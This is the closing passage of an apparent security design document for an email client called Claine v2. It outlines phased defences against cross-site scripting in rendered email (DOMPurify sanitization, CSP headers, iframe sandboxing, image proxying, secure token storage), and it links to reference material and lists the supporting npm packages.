**Phase 2: Enhanced Security** (Minor breaking changes)
1. Implement iframe sandboxing (may affect email layout)
2. Block external images by default (user setting)
3. Add Trusted Types (Chrome/Edge only)

**Phase 3: Security Hardening** (Major changes)
1. Remove support for `<style>` tags in emails
2. Implement server-side sanitization pipeline
3. Add link safety warnings
4. Enable security monitoring and alerts

---

## Additional Resources

### Documentation
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify) - Official repository with examples
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Content Security Policy Guide](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [MDN CSP Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Trusted Types API](https://web.dev/articles/trusted-types)

### Security Research
- [Mutation XSS via Namespace Confusion (Securitum)](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
- [Bypassing DOMPurify with mXSS (PortSwigger)](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
- [mXSS Attacks Paper (Cure53)](https://cure53.de/fp170.pdf)
- [Email Tracking Pixel Analysis (Proton)](https://proton.me/blog/pixel-tracking)

### Testing Tools
- [XSS Payload List (OWASP)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
- [DOMPurify Demo](https://cure53.de/purify) - Test sanitization in browser

### NPM Packages
```json
{
  "dependencies": {
    "dompurify": "^3.3.0",           // Primary sanitization
    "sanitize-html": "^2.14.0",      // Server-side sanitization
    "helmet": "^8.0.0",              // Express security headers
    "jsdom": "^25.0.0",              // Node.js DOM for DOMPurify
    "sharp": "^0.34.0"               // Image processing for proxy
  },
  "devDependencies": {
    "@types/dompurify": "^3.2.0"
  }
}
```

---

## Conclusion

Email XSS prevention requires a **multi-layered security approach** combining:

1. **Client-side sanitization** with DOMPurify (primary defense)
2. **Content Security Policy** headers (prevent script execution)
3. **Iframe sandboxing** (isolate email from application context)
4. **Image proxying** (block tracking, hide user metadata)
5. **Secure token storage** (httpOnly cookies, not localStorage)

**For Claine v2**, prioritize:
- **Week 1**: Deploy DOMPurify + fix token storage (addresses CVSS 8.1 vulnerabilities)
- **Week 2-3**: Implement iframe sandboxing + CSP headers (defense-in-depth)
- **Week 3-4**: Build image proxy (privacy + tracking prevention)
- **Ongoing**: Monitor DOMPurify updates, test against new XSS vectors

This approach mirrors industry leaders (Gmail, ProtonMail, Outlook) while remaining practical for a v2 rebuild.

---

**Document Status**: Ready for Implementation
**Next Steps**: Review with security team, create implementation tickets, schedule penetration testing after Phase 2 deployment.
